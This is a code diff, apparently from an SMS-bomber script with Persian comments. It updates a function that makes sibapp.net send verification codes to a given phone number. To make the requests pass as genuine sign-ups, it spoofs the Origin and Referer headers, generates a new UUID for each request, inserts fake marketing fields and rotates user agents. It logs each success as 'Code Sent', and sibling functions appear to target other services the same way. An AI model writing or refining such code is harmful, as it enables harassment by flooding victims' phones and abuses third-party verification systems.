@@ -66,19 +66,41 @@ def send_service_safe(service, phone):
 
 def SibApp(phone):
     try:
-        url = "https://api.sibapp.net/api/v1/user/register"
+        url = "https://api.sibapp.net/api/v1/action"
+        
+        # فرمت شماره
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        
         headers = {
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json; charset=UTF-8",
             "Cache-Control": "no-cache",
-            "User-Agent": random.choice(user_agents)
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://sibapp.net",
+            "Referer": "https://sibapp.net/",
         }
         
-        # فرمت شماره برای SibApp: بدون +98 و فقط اعداد
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        # ایجاد UUID یکتا برای هر درخواست
+        user_unique_id = str(uuid.uuid4())
         
         payload = {
-            "phone_number": formatted_phone
+            "name": "phone_number_verify",
+            "data": {
+                "utm": {
+                    "source": "google",
+                    "medium": "organic",
+                    "campaign": ""
+                },
+                "user_unique_id": user_unique_id,
+                "purchase_flow": "",
+                "purchase_flow_version": "purchaseFlowABGroup",
+                "package_a_b_group": None,
+                "package_a_b_group_version": "packagesABGroupV11",
+                "register_a_b_group": "c",
+                "register_a_b_group_version": "registerABGroupV3",
+                "phone_number": formatted_phone  # اضافه کردن شماره تلفن
+            }
         }
         
         response = requests.post(
@@ -88,18 +110,21 @@ def SibApp(phone):
             timeout=10
         )
         
-        print(f'{y}[Debug] SibApp Response: {response.status_code} - {response.text}{a}')
+        print(f'{y}[Debug] SibApp Status: {response.status_code}{a}')
+        print(f'{y}[Debug] SibApp Response: {response.text}{a}')
         
-        if response.status_code in [200, 201]:
-            print(f'{g}(SibApp) Code Sent{a}')
-            return True
-        elif response.status_code == 400:
-            # بررسی دقیق‌تر خطای 400
+        if response.status_code in [200, 201, 202]:
             try:
-                error_data = response.json()
-                print(f'{r}[-] SibApp Error: {error_data}{a}')
+                data = response.json()
+                if data.get("name") == "phone_number_verify":
+                    print(f'{g}(SibApp) Code Sent{a}')
+                    return True
             except:
-                print(f'{r}[-] SibApp Bad Request: {response.text}{a}')
+                if "phone_number_verify" in response.text:
+                    print(f'{g}(SibApp) Code Sent{a}')
+                    return True
+        elif response.status_code == 400:
+            print(f'{r}[-] SibApp Bad Request{a}')
             return False
         else:
             print(f'{r}[-] SibApp HTTP Error: {response.status_code}{a}')
@@ -108,7 +133,8 @@ def SibApp(phone):
     except Exception as e:
         print(f'{r}[!] SibApp Exception: {e}{a}')
         return False
-        
+
+
 
 def Balad(phone):
     try:
